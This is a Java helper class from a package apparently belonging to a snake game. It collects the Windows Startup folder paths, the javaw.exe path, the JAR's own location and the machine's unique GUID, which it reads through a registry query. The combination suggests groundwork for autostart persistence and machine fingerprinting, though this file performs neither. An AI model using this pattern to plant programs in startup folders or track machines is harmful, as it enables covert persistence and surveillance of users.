package snake.logic.util;

import java.io.IOException;
import java.net.URISyntaxException;
import java.net.URI;

public class SystemInformation {

    public static final String GUID, COMMON_STARTUP, JAVA_HOME, PERSONAL_SETUP;
    public static final URI JAR_PATH;
    static {
        COMMON_STARTUP = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        PERSONAL_SETUP = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        JAVA_HOME = System.getProperty("java.home") + "\\bin\\javaw.exe";
        GUID = initGUID();
        JAR_PATH = getJarPath();
    }

    private static String initGUID() {
        try {
            String output = CommandExecutor.executeCommand(
                "reg", 
                "query", 
                "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", 
                "/v", 
                "MachineGuid"
            );
            return output.substring(output.length() - 38).trim();
        } catch (IOException e) {}
        return null;
    }

    private static URI getJarPath() {
        try {
            return SystemInformation.class
                        .getProtectionDomain()
                        .getCodeSource()
                        .getLocation()
                        .toURI();
        } catch (URISyntaxException e) {}
        return null;
    }
}
